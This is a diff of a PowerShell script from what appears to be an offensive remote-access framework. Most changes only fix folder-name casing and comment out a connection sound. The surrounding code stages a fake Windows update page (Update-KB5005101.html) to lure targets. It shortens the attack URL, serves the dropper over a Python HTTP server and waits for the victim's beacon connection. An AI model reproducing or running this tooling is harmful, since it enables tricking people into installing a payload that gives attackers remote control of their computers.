@@ -553,15 +553,15 @@ If($check -ieq $False)
     }
 
     write-Host "[i] Send the URL generated to target to trigger download.." -ForegroundColor DarkGray;
-    Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
-    Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
-    Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
+    Copy-Item -Path "${IPATH}\mimiRatz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
+    Copy-Item -Path "${IPATH}\mimiRatz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
+    Copy-Item -Path "${IPATH}\mimiRatz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
     ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"
 
     Write-Host "[i] Attack Vector: http://$Server_port/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white
 
     #tinyurl function
-    powershell -file "${IPATH}\Mimiratz\shorturl.ps1" -ServerPort "$Server_port" -PayloadName "${Dropper_Name}.html"
+    powershell -file "${IPATH}\mimiRatz\shorturl.ps1" -ServerPort "$Server_port" -PayloadName "${Dropper_Name}.html"
 
     ## Start python http.server (To Deliver Dropper/Payload)
     Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;$PInterpreter -m http.server $HTTP_PORT --bind $Local_Host";
@@ -685,9 +685,9 @@ else
 
   #write onscreen
   write-Host "[i] Send the URL generated to target to trigger download."
-  Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
-  Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
-  Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
+  Copy-Item -Path "${IPATH}\mimiRatz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
+  Copy-Item -Path "${IPATH}\mimiRatz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
+  Copy-Item -Path "${IPATH}\mimiRatz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
   ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"
 
   Write-Host "[i] Attack Vector: http://$Local_Host/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white;
@@ -747,9 +747,9 @@ $Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString
 Write-Host "[-] Beacon received: $Remote_Host" -ForegroundColor Green
 
 #Play sound on session creation
-$PlayWav = New-Object System.Media.SoundPlayer
-$PlayWav.SoundLocation = "${IPATH}\Mimiratz\theme\ConnectionAlert.wav"
-$PlayWav.playsync();
+#$PlayWav = New-Object System.Media.SoundPlayer
+#$PlayWav.SoundLocation = "${IPATH}\mimiRatz\theme\ConnectionAlert.wav"
+#$PlayWav.playsync();
 
 $Stream = $Client.GetStream();
 $WaitData = $False;
